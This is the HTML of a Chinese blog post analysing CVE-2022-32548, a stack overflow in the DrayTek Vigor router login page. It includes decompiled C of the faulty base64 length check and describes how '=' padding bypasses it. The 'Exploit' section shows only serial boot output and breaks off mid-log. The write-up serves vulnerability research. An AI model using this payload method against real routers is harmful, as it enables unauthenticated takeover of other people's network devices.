<!DOCTYPE html>
<html lang=EN>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta property="og:type" content="article">
<meta property="og:title" content="CVE-2022-32548 DrayTeck 栈溢出漏洞分析">
<meta property="og:url" content="https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html">
<meta property="og:site_name" content="Swing&#39;Blog 浮生若梦">
<meta property="og:locale">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-20-c69eb298cb0fe09abc4ea7d5405e0a30-6e9f0e.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-04-29-64de88a39870b052b3e01d824a6f3b83-61799f.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-28-bb64dffbb21d22a20a84dcf37b1fddd6-4ec5e4.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-af71d98c211dbd6a59feee082ebe15b6-3fdfed.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-92f19cb9d0608f4f58d3e4cd244c72b1-392eaf.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-be60d5f11a1865aa7487931264edfee5-8e53df.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-1383c80801d983eb6a2e3ca3bd499a9b-75928d.png">
<meta property="article:published_time" content="2023-04-28T16:00:00.000Z">
<meta property="article:modified_time" content="2023-04-29T10:01:47.457Z">
<meta property="article:author" content="Swing">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="CVE-2022-32548">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-20-c69eb298cb0fe09abc4ea7d5405e0a30-6e9f0e.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>CVE-2022-32548 DrayTeck 栈溢出漏洞分析</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 浮生若梦" type="application/atom+xml" />
    
<meta name="generator" content="Hexo 5.4.2"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/RWCTF-5th-Writeup.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html&text=CVE-2022-32548 DrayTeck 栈溢出漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html&title=CVE-2022-32548 DrayTeck 栈溢出漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html&is_video=false&description=CVE-2022-32548 DrayTeck 栈溢出漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2022-32548 DrayTeck 栈溢出漏洞分析&body=Check out this article: https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html&title=CVE-2022-32548 DrayTeck 栈溢出漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html&title=CVE-2022-32548 DrayTeck 栈溢出漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html&title=CVE-2022-32548 DrayTeck 栈溢出漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html&title=CVE-2022-32548 DrayTeck 栈溢出漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html&name=CVE-2022-32548 DrayTeck 栈溢出漏洞分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html&t=CVE-2022-32548 DrayTeck 栈溢出漏洞分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Cause"><span class="toc-number">1.</span> <span class="toc-text">Root Cause</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">2.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">3.</span> <span class="toc-text">补充</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference-link"><span class="toc-number">4.</span> <span class="toc-text">Reference link</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        CVE-2022-32548 DrayTeck 栈溢出漏洞分析
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Swing</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-04-28T16:00:00.000Z" itemprop="datePublished">2023-04-29</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/CVE-2022-32548/" rel="tag">CVE-2022-32548</a>, <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>这个漏洞是我去年 9 月份复现的，一直拖更没有发布在我的 Blog 。因为到考虑 Blog 太久没更新了，所以趁着假期整理下笔记，然后发表在 Blog 上吧。顺便一提， 本篇文章没有什么技术含量，大佬可以忽略不看了。</p>
<p>我这里分析的版本是 Vigor 2912 型号 , 固件版本为 3.8.12 。固件可以从<a href="https://fw.draytek.com.tw/">官网下载</a> <sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="[Index of /Vigor2925 (draytek.com.tw)](https://fw.draytek.com.tw/Vigor2925/)
">[1]</span></a></sup>, 但是这个属于DrayOS 的系统固件是需要逆向解压代码的，这部分内容不在本篇文章的讨论范围，大家可以参考漏洞的作者 slide<sup id="fnref:2"><a href="#fn:2" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="[HEXACON2022 - Emulate it until you make it! Pwning a DrayTek Router by Philippe Laulheret - YouTube](https://www.youtube.com/watch?v=CD8HfjdDeuM)
">[2]</span></a></sup> 。这里我就不展开赘述了。</p>
<h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>解压固件后， 我们会得到一个 RTOS 的大Binary 文件, 我们可以通过 rbasefind<sup id="fnref:3"><a href="#fn:3" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="[sgayou/rbasefind: A firmware base address search tool. (github.com)](https://github.com/sgayou/rbasefind)
">[3]</span></a></sup> 或者其他方法获取固件的加载基地址，例如我这里使用 rbasefind 查找出了一个结果：0x80020000</p>
<p>通过 IDA 加载设置好加载地址，然后等待分析结束。在这个过程中呢，我们可以再阅读下漏洞通告<sup id="fnref:4"><a href="#fn:4" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="[Unauthenticated Remote Code Execution in a Wide Range of DrayTek Vigor Routers (trellix.com)](https://www.trellix.com/en-us/about/newsroom/stories/research/rce-in-dratyek-routers.html)">[4]</span></a></sup>的描述:</p>
<p>Exploitation attempts can be detected by logging/alerting when a malformed base64 string is sent via a POST request to the /cgi-bin/wlogin.cgi end-point on the web management interface router. Base64 encoded strings are expected to be found in the aa and ab fields of the POST request. Malformed base64 strings indicative of an attack would have an abnormally high number of %3D padding. Any number over three should be considered suspicious.</p>
<p>通过这个描述我们可以得出几个结论：</p>
<ol>
<li>通过触发接口是  <code>/cgi-bin/wlogin.cgi</code> 即登录接口</li>
<li>提到了 <code>%3D</code> 可以猜测漏洞出现在 <code>base64_decode</code> 函数中 </li>
</ol>
<p>紧接着我抓去了一个正常登录的 HTTP 请求包，等待 IDA 分析完之后通过对字符串进行交叉引用，找到了对应的漏洞函数：</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-20-c69eb298cb0fe09abc4ea7d5405e0a30-6e9f0e.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-20-c69eb298cb0fe09abc4ea7d5405e0a30-6e9f0e.png"></a></p>
<p>可以看到 username  和 password 都会通过 base64_decode 这个函数进行解密，这个函数的参数格式为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64_decode(<span class="keyword">char</span> *input, <span class="keyword">char</span> *output, <span class="keyword">unsigned</span> <span class="keyword">int</span> maxlen)</span><br></pre></td></tr></table></figure>

<p>我们看到第三个参数看似是限制了最大 decode 长度，但是实际上这个值真的生效了吗？ 我们继续往下看</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-04-29-64de88a39870b052b3e01d824a6f3b83-61799f.png" title="image-20230429164323660" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-04-29-64de88a39870b052b3e01d824a6f3b83-61799f.png" alt="image-20230429164323660"></a></p>
<p>这里会有一个 <code>calc_decdoe_len</code>的函数，来计算 base64 decode 后的长度是不是大于 maxlen 如果大于就退出。 那么我们就基本判定大概率问题是出现在了这个函数中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __fastcall <span class="title">calc_decode_len</span><span class="params">(<span class="keyword">char</span> *input_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> inputlen; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> decode_out_len; <span class="comment">// $a1</span></span><br><span class="line">  <span class="keyword">int</span> out_len; <span class="comment">// $v1</span></span><br><span class="line">  _BYTE *in_end_chr; <span class="comment">// $a0</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> offset; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// $a1</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// $a2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !input_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  inputlen = <span class="built_in">strlen</span>(input_buf);</span><br><span class="line">  decode_out_len = <span class="number">3</span> * (inputlen &gt;&gt; <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !inputlen )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span> * (inputlen &gt;&gt; <span class="number">2</span>);</span><br><span class="line">  out_len = decode_out_len - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( input_buf[inputlen - <span class="number">1</span>] != <span class="string">&#x27;=&#x27;</span> )         <span class="comment">// 最后一位如果不是 = ， 就直接返回长度</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span> * (inputlen &gt;&gt; <span class="number">2</span>);</span><br><span class="line">  in_end_chr = &amp;input_buf[inputlen];</span><br><span class="line">  offset = decode_out_len - inputlen;</span><br><span class="line">  <span class="keyword">if</span> ( out_len != offset )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = (<span class="keyword">char</span>)*(in_end_chr - <span class="number">2</span>);             <span class="comment">// 如果倒数第二位不是 = ， 就 break ， 返回 out_len </span></span><br><span class="line">      v8 = out_len - <span class="number">1</span>;</span><br><span class="line">      --in_end_chr;</span><br><span class="line">      <span class="keyword">if</span> ( v7 != <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      --out_len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v8 != offset );                     <span class="comment">// --outlen 直到当前的字符不为 = ， 或者 长度等于 </span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> out_len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>通过阅读代码，我们找到了这个函数的问题所在：</p>
<p>大致就是， 首先通过 <code>3 * (inputlen &gt;&gt; 2);</code> 计算出一个长度 ， 然后判断最后一位是不是 = ， 如果不是直接返回， 如果是接着往下走。 </p>
<p>然后我们注意到这里有个减法运算 <code> offset = decode_out_len - inputlen;</code> ， 正常而言， 这里的 <code>deocde_out_len</code> 应该是小于 <code>inputlen</code> 的所以这里会是一个  负数。</p>
<p>然后进到 <code>do .. while ()</code> 循环中， 只有当 当前字符不为 = 或者， <code>v8 == offset</code> 的时候才会退出循环， 由于 offset 是个负数， 因此只有当前字符不为 = 才会退出返回。然会这里的长度就会<code>--out_len</code> 递减。</p>
<p>根据base64 的原理我们知道四个 = 为空</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64decode(<span class="string">&quot;====&quot;</span>)</span><br><span class="line"><span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因此在构造我们 payload 的时候， 每多于 maxlen（这里是 84 ） 的长度一个字符， 我们就需在后面添加  四个 等号。 这样 deocde 后的长度永远不会大于 84， 但是真正 decode 的结果却会大于 maxlen</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>拆开机器，可以发现右下角 4 个pin 的是 调试口 。</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-28-bb64dffbb21d22a20a84dcf37b1fddd6-4ec5e4.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-28-bb64dffbb21d22a20a84dcf37b1fddd6-4ec5e4.png"></a></p>
<p>接着串口后， 可看到一些输出</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> ~~Hope you find out the clue here~~</span><br><span class="line">Caught reserved exception 11 - should not happen.NMI taken!!!!</span><br><span class="line">@@@die: NMI @@@</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Vigor2912-DrayLoader-v7 (May  7 2015 - 15:11:57)</span><br><span class="line"></span><br><span class="line">MT6856</span><br><span class="line">DRAM Size: 64 MB</span><br><span class="line">CPU Frequency: 700 MHZ</span><br><span class="line">Flash Manufacture ID: 0xC2, Device ID: 0x20 0x17, Name: MX25L6405D</span><br><span class="line">Flash Size: 8 MB</span><br><span class="line"></span><br><span class="line">Boot DrayOS~~</span><br><span class="line">run_drayos_image: len=5085180</span><br><span class="line">Go~~</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> !!! Maxi malloc size =31614752 (st=0X821d88e0, end=0X83fff000)!!!!</span><br><span class="line"></span><br><span class="line"> dynamic_mem_pool=0x821e52b0, size=0xc80fff[12M]!Modes: __STDC__ 32-bit mwDWORD==(unsigned long)</span><br><span class="line">mwROUNDALLOC==4 sizeof(mwData)==24 mwDataSize==24</span><br><span class="line"></span><br><span class="line">statistics: now collecting on a line basis</span><br><span class="line"></span><br><span class="line">============= Memwatch Auto Self Test =============</span><br><span class="line"></span><br><span class="line">Normal Free...DETECTED</span><br><span class="line">Double Free...DETECTED</span><br><span class="line">NULL Free.....DETECTED</span><br><span class="line">Wild Free.....DETECTED</span><br><span class="line">Underflow.....DETECTED</span><br><span class="line">Overflow......DETECTED</span><br><span class="line">Unfree 1......DETECTED</span><br><span class="line">Unfree 2......DETECTED</span><br><span class="line"></span><br><span class="line">ALL TEST OK!</span><br><span class="line">Please be assured that all <span class="built_in">test</span> buffers have freed.</span><br><span class="line">Slab kmalloc range:     [0x821E52B0:0x82E662AF](size=13111295 bytes)</span><br><span class="line">Linear malloc range:    [0x821D88D0:0x83FFF000](size=31614768 bytes)</span><br><span class="line"></span><br><span class="line"> ra_system_init() <span class="keyword">in</span>:&lt;6&gt;ISPRAM0: PA=00b68000,Size=00008000,enabled</span><br><span class="line">&lt;6&gt;CPU revision is: 00019555 (MIPS 34Kc)</span><br><span class="line">Ralink RT63365 SOC prom init</span><br><span class="line"></span><br><span class="line"> prom_init() doneFIXME!!! Do we need to complete specific hardware CPU clock setting? or time_init() would complete it ?</span><br><span class="line">set_except_vector: n=0, addr=8003cb80</span><br><span class="line">set_except_vector: n=0, addr=80027684</span><br><span class="line"></span><br><span class="line"> trap_init() <span class="keyword">done</span></span><br><span class="line"> plat_mem_setup() <span class="keyword">done</span>&lt;6&gt;NR_IRQS:64</span><br><span class="line"></span><br><span class="line"> init_IRQ()...CPU frequency 699.00 MHz</span><br><span class="line">clockevents_register_device</span><br><span class="line">cp0_timer_irq_installed: irq = 31</span><br><span class="line">__setup_irq: irq=31, desc=80a80d30, p=80a80030</span><br><span class="line">desc-&gt;chip=80a801d0, desc-&gt;chip-&gt;startup=80030078</span><br><span class="line"></span><br><span class="line"> time_init()...</span><br><span class="line"> skb_init() donePrimary instruction cache 64kB, VIPT, 4-way, linesize 32 bytes.</span><br><span class="line">Primary data cache 32kB, 4-way, VIPT, cache aliases, linesize 32 bytes</span><br><span class="line"></span><br><span class="line"> cache_init() <span class="keyword">done</span></span><br><span class="line"> ralink_led_init() <span class="keyword">done</span>!!!__setup_irq: irq=29, desc=80a80c90, p=821e8fa0</span><br><span class="line">desc-&gt;chip=80a801d0, desc-&gt;chip-&gt;startup=80030078</span><br><span class="line">Adapter_Interrupts_Init: Successfully hooked IRQ 29</span><br><span class="line"></span><br><span class="line">Adapter_Interrupts_Init: call back registeredAdapter_EIP93_Init: CmdRing_Handle=82e7232c</span><br><span class="line">Adapter_EIP93_Init: ResRing_Handle=82e72328</span><br><span class="line">Adapter: Successfully initialized EIP93v2 <span class="keyword">in</span> ARM mode</span><br><span class="line">PEC_Init: PRNG is initialized</span><br><span class="line">== IPSEC Crypto Engine Driver : Jul  8 2020 15:25:56 ==</span><br><span class="line"></span><br><span class="line"> hw_crypto_init() <span class="keyword">done</span></span><br><span class="line"> NR_IRQS=64.</span><br><span class="line"> ** Enable Global Int **..end..</span><br><span class="line">flash manufacture id: c2, device id 20 17</span><br><span class="line">MX25L6405D(c2 2017c220) (8192 Kbytes)</span><br><span class="line">../sys_misc.c.584: snprintf <span class="built_in">test</span> pass!</span><br><span class="line">../sys_misc.c.584: vsnprintf <span class="built_in">test</span> pass!</span><br><span class="line">GMAC1_MAC_ADRH -- : 0x0000001d</span><br><span class="line">SMACCR1 -- : 0x0000001d</span><br><span class="line">GMAC1_MAC_ADRL -- : 0xaa93e52c</span><br><span class="line">SMACCR0 -- : 0xaa93e52c</span><br><span class="line">Ralink APSoC Ethernet Driver Initilization. v3.0  256 rx/tx descriptors allocated, mtu = 1500!</span><br><span class="line">Raeth v3.0 (Workqueue)</span><br><span class="line">__setup_irq: irq=22, desc=80a80a60, p=821e8ea0</span><br><span class="line">desc-&gt;chip=80a801d0, desc-&gt;chip-&gt;startup=80030078</span><br><span class="line"></span><br><span class="line">phy_tx_ring = 0x021ef000, tx_ring = 0xa21ef000</span><br><span class="line"></span><br><span class="line">phy_rx_ring0 = 0x022c6000, rx_ring0 = 0xa22c6000</span><br><span class="line">Fiber ID does not match (FFFF, FFFF)</span><br><span class="line">Fiber does not exist</span><br><span class="line">GMAC1_MAC_ADRH -- : 0x0000001d</span><br><span class="line">SMACCR1 -- : 0x0000001d</span><br><span class="line">GMAC1_MAC_ADRL -- : 0xaa93e52c</span><br><span class="line">SMACCR0 -- : 0xaa93e52c</span><br><span class="line">__setup_irq: irq=16, desc=80a80880, p=821e8e20</span><br><span class="line">desc-&gt;chip=80a801d0, desc-&gt;chip-&gt;startup=80030078</span><br><span class="line">ESW: Link Status Changed - Port2 Link UP</span><br><span class="line">CDMA_CSG_CFG = 81000007</span><br><span class="line">GDMA1_FWD_CFG = C0710000</span><br><span class="line">start PCIe register access</span><br><span class="line"></span><br><span class="line">*************** RT6855A PCIe RC mode *************</span><br><span class="line">PCIE0 no card, <span class="built_in">disable</span> it</span><br><span class="line">PCIE1 no card, <span class="built_in">disable</span> it(RST&amp;CLK)</span><br><span class="line">&lt;4&gt;registering PCI controller with io_map_base <span class="built_in">unset</span></span><br><span class="line"></span><br><span class="line">[SS][Init] Load Service Status from FLASH!!</span><br><span class="line">&lt;6&gt;uVigor2912 by DrayTek Corp.erface driver hub</span><br><span class="line">&lt;6&gt;u==========================ice driver usb</span><br><span class="line">    LAN MAC Address  : 00-1D-AA-93-E5-2C</span><br><span class="line"> usbIP Address       : 192.168.2.1</span><br><span class="line">RT3xIP Subnet Mask   : 255.255.255.0</span><br><span class="line">&lt;6&gt;eFirmware Version : 3.8.12d<span class="string">&#x27; Host Controller (EHCI) Driver</span></span><br><span class="line"><span class="string">__seSystem Up Time   : 0:0:0a80920, p=822ddfa0</span></span><br><span class="line"><span class="string">desc-------- Main Menu ---------&gt;startup=80030078</span></span><br><span class="line"><span class="string">FIXM1 : Enable TFTP Server</span></span><br><span class="line"><span class="string">   Please Select Item : &lt;6&gt;ohci_hcd: USB 1.1 &#x27;</span>Open<span class="string">&#x27; Host Controller (OHCI) Driver</span></span><br><span class="line"><span class="string">VLAN table[2~7] cleaned</span></span><br><span class="line"><span class="string"> usb host init done!!</span></span><br><span class="line"><span class="string">&lt;6&gt;usbcore: registered new interface driver usblp</span></span><br><span 